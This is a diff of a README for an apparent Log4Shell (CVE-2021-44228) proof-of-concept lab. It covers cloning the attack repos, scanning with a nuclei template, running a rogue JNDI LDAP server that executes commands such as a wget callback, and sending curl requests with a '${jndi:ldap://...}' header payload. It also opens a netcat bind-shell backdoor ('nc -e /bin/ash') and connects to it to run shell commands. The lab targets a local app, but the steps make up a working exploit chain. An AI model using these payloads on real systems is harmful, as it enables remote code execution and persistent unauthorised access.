@@ -13,8 +13,9 @@ All three repos have their origin in separate upstream projects (see following s
 
 # Requirements
 
-1. Java
-2. Maven
+1. Docker
+2. Java
+3. Maven
 
 ## Install maven
 
@@ -25,6 +26,17 @@ brew install maven
 ```
 
 # Setup
+
+## clone the repos
+
+```bash
+git clone git@github.com:druminik/log4shell-poc.git
+git clone git@github.com:druminik/log4shell-vulnerable-app.git
+git clone git@github.com:druminik/nuclei.git
+git clone git@github.com:druminik/nuclei-templates.git
+git clone git@github.com:druminik/rogue-jndi.git
+
+```
 
 ## Run the vulnerable app
 
@@ -59,6 +71,8 @@ nuclei -duc -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://yo
 ```
 
 If the remote server is vulnerable to the log4shell bug, it will give you an output like following. The last element in the output (8dc4a6fbe91b) is the remote server's hostname.
+
+Example
 
 ```bash
 $> nuclei -duc -t /root/nuclei-templates/cves/2021/CVE-2021-44228.yaml -u http://192.168.1.126:8080
@@ -100,25 +114,31 @@ mvn compile package
 java -jar target/RogueJndi-1.1.jar -c "wget http://your-private-ip:8000/callback/gugus"
 ```
 
+Example
+
 ```bash
 java -jar target/RogueJndi-1.1.jar -c "wget http://192.168.1.126:8000/callback/gugus"
 ```
 
-## Issue simple attack
+## Run simple attack
 
 Call the vulnerable app (on 127.0.0.1:8080) to load remote code from your jndi server (jndi:ldap://your-private-ip:1389). The code is referenced by the path (/o=reference).
 Replace the code to be executed as you wish. You'll find it in the following file:
 rogue-jndi/src/main/java/artsploit/ExportObject.java
 
+Run the following command in a new console
+
 ```bash
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/o=reference}'
 ```
+
+Example
 
 ```bash
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://192.168.1.126:1389/o=reference}'
 ```
 
-## Backdoor
+## open backdoor on server running vulnerable app
 
 Let's start a backdor using netcat (nc) on the vulnerable app server.
 
@@ -128,19 +148,20 @@ Restart the jndi server with the following command.
 java -jar target/RogueJndi-1.1.jar -c "nc -vv -l -p 3001 -e /bin/ash"
 ```
 
-Start the remote nc server on the vulnerable app
+Start the remote nc server on the vulnerable app.
+Run the following command in a new console
 
 ```bash
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-private-ip:1389/o=reference}'
 ```
 
-Login with nc
+In a new console login with nc
 
 ```bash
 nc -v localhost 3001
 ```
 
-Run some commands
+Test the backdoor by executing some linux shell commands and have fun
 
 ```
 ls
